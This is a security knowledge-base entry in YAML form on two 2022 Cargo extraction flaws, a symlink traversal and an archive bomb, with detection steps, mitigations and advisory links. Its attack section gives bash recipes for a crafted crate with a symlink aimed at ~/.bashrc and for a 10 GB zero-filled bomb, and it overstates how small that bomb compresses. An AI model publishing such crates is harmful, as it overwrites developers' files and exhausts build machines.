---
name: "Cargo Crate Extraction Attacks"
packageManager: "cargo"
slug: "cargo-extraction-attacks"
category: "Supply Chain"
severity: "medium"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "Malicious crates published to crates.io can exploit vulnerabilities in Cargo's archive extraction process. These attacks include symlink traversal (where a crate's tarball contains symlinks that point to files outside the extraction directory, allowing overwrites of arbitrary files) and archive bombs (extremely compressed archives that exhaust disk space when extracted). Both CVE-2022-36113 (symlink extraction) and CVE-2022-36114 (disk space exhaustion) demonstrated that the crate download-and-extract pipeline itself can be weaponized without any build.rs or proc-macro involvement."
prerequisites:
  - "Ability to publish a crafted crate to crates.io with a manipulated .crate archive"
  - "The victim must download the crate via cargo build, cargo fetch, or cargo install"
  - "For symlink attacks: the target operating system must support symbolic links"
attackScenarios:
  - title: "Symlink Traversal to Overwrite Arbitrary Files (CVE-2022-36113)"
    description: "An attacker crafts a .crate archive containing a symbolic link that points to a location outside the expected extraction directory. When Cargo extracts the crate, it follows the symlink and writes attacker-controlled content to an arbitrary file on the victim's filesystem. This can overwrite configuration files, inject code into other projects, or modify shell startup scripts."
    commands:
      - label: "Conceptual attack: crafting a crate with a malicious symlink"
        code: |
          # The attacker manually constructs a .crate tarball
          # containing a symlink that escapes the extraction directory

          mkdir -p evil-crate-0.1.0/src
          echo 'fn main() {}' > evil-crate-0.1.0/src/main.rs
          cat > evil-crate-0.1.0/Cargo.toml << 'EOF'
          [package]
          name = "evil-crate"
          version = "0.1.0"
          edition = "2021"
          EOF

          # Create a symlink pointing outside the extraction directory
          cd evil-crate-0.1.0
          ln -s ../../../.bashrc bashrc_link

          # Package into a tarball (bypassing normal cargo package)
          cd ..
          tar czf evil-crate-0.1.0.crate evil-crate-0.1.0/
        language: "bash"
      - label: "When Cargo extracts, it may follow the symlink"
        code: |
          # Cargo downloads and extracts the crate to:
          # ~/.cargo/registry/src/index.crates.io-*/evil-crate-0.1.0/
          #
          # The symlink bashrc_link -> ../../../.bashrc
          # could allow a subsequent file write to overwrite ~/.bashrc
          cargo install evil-crate
        language: "bash"
  - title: "Disk Space Exhaustion via Archive Bomb (CVE-2022-36114)"
    description: "An attacker publishes a crate whose .crate archive contains highly compressed data that expands to an enormous size when extracted, exhausting available disk space. This can cause denial of service on build servers, CI/CD systems, or developer machines."
    commands:
      - label: "Conceptual archive bomb construction"
        code: |
          # Create a file with highly repetitive content that compresses well
          # A few KB compressed can expand to many GB
          dd if=/dev/zero bs=1M count=10240 > evil-crate-0.1.0/src/data.bin
          # The resulting .crate file is small but extracts to 10GB+
          tar czf evil-crate-0.1.0.crate evil-crate-0.1.0/
        language: "bash"
      - label: "Victim's build fails due to disk exhaustion"
        code: |
          cargo build
          # Error: No space left on device
          # The CI/CD runner or developer machine runs out of disk
        language: "bash"
detection:
  - title: "Check Cargo version for known patches"
    description: "Verify that the installed version of Cargo includes patches for CVE-2022-36113 and CVE-2022-36114 (fixed in Rust 1.64.0)."
    commands:
      - code: "cargo --version"
        language: "bash"
  - title: "Monitor disk usage during builds"
    description: "Set up disk usage monitoring to detect sudden spikes during cargo build operations that could indicate an archive bomb."
    commands:
      - code: |
          # Monitor disk usage in the cargo registry during builds
          watch -n 1 'du -sh ~/.cargo/registry/src/ 2>/dev/null'
        language: "bash"
  - title: "Scan for symlinks in extracted crates"
    description: "Check for unexpected symbolic links in the cargo registry source directory."
    commands:
      - code: "find ~/.cargo/registry/src/ -type l -ls"
        language: "bash"
mitigation:
  - "Update Rust and Cargo to version 1.64.0 or later, which includes patches for both CVEs"
  - "Set disk quotas on build environments to limit the impact of archive bombs"
  - "Use containerized build environments with limited disk space allocation"
  - "Monitor disk usage in CI/CD pipelines and fail builds that exceed thresholds"
  - "Regularly audit the cargo registry cache for unexpected symlinks or large files"
references:
  - title: "GHSA-wrrj-h57r-vx9p - Cargo extracting malicious crate symlinks"
    url: "https://github.com/advisories/GHSA-wrrj-h57r-vx9p"
  - title: "GHSA-rfj2-q3h3-hm5j - Cargo extracting archive bombs"
    url: "https://github.com/advisories/GHSA-rfj2-q3h3-hm5j"
  - title: "Rust 1.64.0 Release Notes"
    url: "https://blog.rust-lang.org/2022/09/22/Rust-1.64.0.html"
created: 2026-04-02
updated: 2026-04-02
---
